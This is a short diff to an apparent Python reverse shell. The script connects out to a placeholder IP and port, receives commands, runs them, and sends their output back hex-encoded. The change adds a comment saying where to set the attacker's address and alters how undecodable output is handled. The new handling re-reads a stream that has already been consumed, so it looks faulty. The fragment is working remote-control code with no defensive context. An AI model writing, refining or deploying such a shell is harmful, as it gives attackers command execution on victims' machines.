@@ -26,7 +26,7 @@ def hex_handler(text, encode=False, decode=False):
     return new_text
 
 rev_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-rev_socket.connect(('IP', PORT))
+rev_socket.connect(('IP', PORT)) # Set IP and port on this line.
 
 while True:
     command = b''
@@ -56,8 +56,7 @@ while True:
     try:
         stdout = output.stdout.read().decode()
     except UnicodeDecodeError:
-        rev_socket.send(hex_handler('Could not send the data.', encode=True))
-        continue
+        stdout = output.stdout.read().decode('utf-16')
     if stdout:
         rev_socket.send(hex_handler(stdout, encode=True))
         continue
